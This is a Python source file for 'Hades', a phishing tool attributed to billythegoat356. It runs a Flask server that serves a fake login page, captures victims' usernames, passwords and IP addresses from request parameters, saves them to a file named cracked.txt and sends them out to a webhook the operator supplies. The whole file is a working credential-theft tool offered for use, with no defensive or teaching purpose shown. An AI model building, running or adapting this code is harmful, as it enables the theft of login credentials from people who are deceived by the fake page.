# Hades

import logging
from flask import Flask
from flask.globals import request
from requests import post
from pystyle import Add, Anime, Colorate, Colors, Col, Center, System, Write


System.Title('Hades')
System.Size(140, 40)

hades = r'''
  ::   .:    :::.   :::::::-.  .,::::::   .::::::.
 ,;;   ;;,   ;;`;;   ;;,   `';,;;;;''"'  ;;;`    `
,[[[,,,[[[  ,[[ '[[, `[[     [[ [[cccc   '[==/[[[[,
"$$$"""$$$ c$$$cc$$$c $$,    $$ $$""""     '"'    $
 888   "88o 888   888 888_,o8P' 888oo,__  88b    dP
 MMM    YMM YMM   ""` MMMMP"`   """"YUMMM  "YMmMY"
'''

mode = "[$; [$; [$; Phishing ;$] ;$] ;$]"


ascii = r'''
                ::   .:    :::.   :::::::-.  .,::::::   .::::::.
               ,;;   ;;,   ;;`;;   ;;,   `';,;;;;''"'  ;;;`    `
              ,[[[,,,[[[  ,[[ '[[, `[[     [[ [[cccc   '[==/[[[[,
              "$$$"""$$$ c$$$cc$$$c $$,    $$ $$""""     '"'    $
               888   "88o 888   888 888_,o8P' 888oo,__  88b    dP
               MMM    YMM YMM   ""` MMMMP"`   """"YUMMM  "YMmMY"
                          ___
  .::.                   ( ((
 'H .-;-.-.-.-.-.-.-.-.-/| ((::::::::::::::::::::::::::::::::::::::::::::::.._
(D ( ( ( ( ( ( ( ( ( ( ( |  ))   -====================================-      _.>
 `S `-;-`-`-`-`-`-`-`-`-\| ((::::::::::::::::::::::::::::::::::::::::::::::''
  `::'                    \ \(
                           ) ))
                          (_(('''[1:]


log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask("Hades")



def send(args: str, ip: str):

    fields = []

    username, password = args.get('username'), args.get('password')

    if username and password:
        fields.append(
            {
                "name": "Username:",
                "value": f"`{username}`",
                "inline": True
            })
        fields.append(
            {
                "name": "Password:",
                "value": f"`{password}`",
                "inline": True
            })
    fields.append(
        {
            "name": "IP:",
            "value": f"`{ip}`"
        })

    embeds = [
        {
            "title": "Hades",
            "description": "Phished!",
            "url": "https://github.com/billythegoat356/Hades",
            "color": 0x800000,
            "fields": fields,
            "footer": {
                "text": "by billythegoat356",
                "icon_url": "https://avatars.githubusercontent.com/u/77754159?v=4"
            },
            "timestamp": "2001-09-10T22:00:00.000Z",
            "image": {
                "url": "https://repository-images.githubusercontent.com/407786206/3e37b6ce-e16c-4f0e-8713-c6cbf1d6b22a"
            },
            "thumbnail": {
                "url": "https://repository-images.githubusercontent.com/407786206/3e37b6ce-e16c-4f0e-8713-c6cbf1d6b22a"
            }
        }
    ]

    data = {"username": "Hades",
            "avatar_url": "https://repository-images.githubusercontent.com/407786206/3e37b6ce-e16c-4f0e-8713-c6cbf1d6b22a",
            "embeds": embeds}

    if len(fields) != 1:
        print(Colorate.Horizontal(Colors.red_to_blue, f"\nPhished!\nUsername: {username}\nPassword: {password}\nIP: {ip}\n\n"))
        if logfile:
            with open('cracked.txt', 'a', encoding='utf-8') as f:
                f.write("Username: " + username + '\nPassword: ' + password + '\nIP: ' + ip + '\n\n')
        if webhook:
            post(webhook, json=data)
    else:
        print(Colorate.Horizontal(Colors.red_to_blue, f"\nLogged!\nIP: {ip}\n\n"))



@app.route('/')
def main_route():
    send(request.args, request.remote_addr)

    with open('index.html', 'r', encoding='utf-8') as f:
        return f.read()



def main():
    global webhook, logfile

    System.Clear()
    print(Colorate.Horizontal(Colors.red_to_purple, Center.XCenter(hades)))
    print()
    print(Colorate.Horizontal(Colors.red_to_purple, Center.XCenter(mode)))
    print('\n'*3)
    port = Write.Input("Enter the port (press 'enter' for '8080') -> ", Colors.red_to_purple, interval=0.0025)
    if port == '':
        port = "8080"
    try:
        port = int(port)
    except ValueError:
        Colorate.Error("Error! Port has to be an integer.")
        return
    host = Write.Input("Enter the host (press 'enter' for '127.0.0.1') -> ", Colors.red_to_purple, interval=0.0025)
    if host == '':
        host = "127.0.0.1"
    print()
    webhook = Write.Input("Enter your webhook (press 'enter' to pass) -> ", Colors.red_to_purple, interval=0.0025)
    logfile = Write.Input("Stock the logs in a file [y/n] -> ", Colors.red_to_purple, interval=0.0025)
    logfile = logfile == "y"
    System.Clear()
    print(Colorate.Horizontal(Colors.red_to_purple, Center.XCenter(hades)))
    print()
    print(Colorate.Horizontal(Colors.red_to_purple, Center.XCenter(mode)))
    print('\n'*2)
    print(Colorate.Color(Colors.purple, f"   Running on: http://{host}:{port}"))
    app.run(host=host, port=port)



if __name__ == '__main__':
    Anime.Fade(Center.Center(ascii), Colors.red_to_purple,
               Colorate.Vertical, time=True, enter=True)
    while True:
        try:
            main()
        except Exception as e:
            Colorate.Error(str(e))
